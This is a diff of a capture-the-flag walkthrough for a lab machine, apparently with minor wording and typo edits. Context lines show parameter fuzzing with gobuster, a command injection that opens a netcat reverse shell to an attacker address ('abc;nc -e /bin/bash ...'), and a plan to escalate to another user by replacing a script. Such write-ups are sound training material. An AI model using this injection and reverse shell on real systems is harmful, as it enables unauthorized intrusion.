@@ -48,7 +48,7 @@ A log of the chat, lets keep checking.
 
 ![](imagenes/Pasted%20image%2020240207203031.png)
 
-Apparently, we can **call** a file here, but, we don't know the variable name that's being used, so, we're going to do some fuzzing with gobuster, and find out the correct variable name with this command: `gobuster fuzz -u http://192.168.25.25:8080/administration.php?FUZZ=prueba -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 65
+Apparently, we can **call** a file here, but, we don't know the variable name that the php script is using, so, we're going to do some fuzzing with gobuster, and find out the correct variable name with this command: `gobuster fuzz -u http://192.168.25.25:8080/administration.php?FUZZ=prueba -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 65
 `
 ![](imagenes/Pasted%20image%2020240207203709.png)
 
@@ -60,7 +60,7 @@ That's good, here we can see the message we typed earlier, lets try and see if w
 
 ![](imagenes/Pasted%20image%2020240207204758.png)
 
-We don't know specifically what the php script does, we can suppose it uses `cat <file>` with `system("cmd")` or something like that. Now, lets try the following command to see if we can get a reverse shell `abc;nc -e /bin/bash 192.168.25.5 4444`
+We don't know specifically what the php script does, we can suppose it uses `cat <file>` with function `system("cmd")` or something like that. Now, lets try the following command to see if we can get a reverse shell: `abc;nc -e /bin/bash 192.168.25.5 4444`
 
 ## Initial access
 
@@ -70,7 +70,7 @@ There we go, first things first, lets get a full tty:
 
 ![](imagenes/Pasted%20image%2020240207205301.png)
 
-We find the user flag, now lets see how we can pivot to another user, or escalate privileges:
+We find the user flag, now lets see how we can switch to another user, or escalate privileges:
 
 ![](imagenes/Pasted%20image%2020240207205430.png)
 
@@ -85,7 +85,7 @@ Checking the help page:
 This php command starts the webserver in port 8080, but, it does it via the `bash terminal`, so, maybe we can replace the contents and just execute a bash shell, with the privileges of the user `julia`.
 
 ***
-### Note: Troubleshoothing
+### Note: Troubleshooting
 At this point, I couldn't edit the file with `echo`, I got the following error `bash: echo: write error: No space left on device`, so, in order to fix that, I had to *resize the machine virtual disk* so it could work again, please do note, that if you do this after you run the machine once, it might break it,in my case, it just wouldn't show me the webpage, so you'll have to import the machine again, so, if you're following this walkthrough, **I recommend resizing this machine's disk beforehand. Now, lets keep going**.
 ***
 ![](imagenes/Pasted%20image%2020240207212415.png)
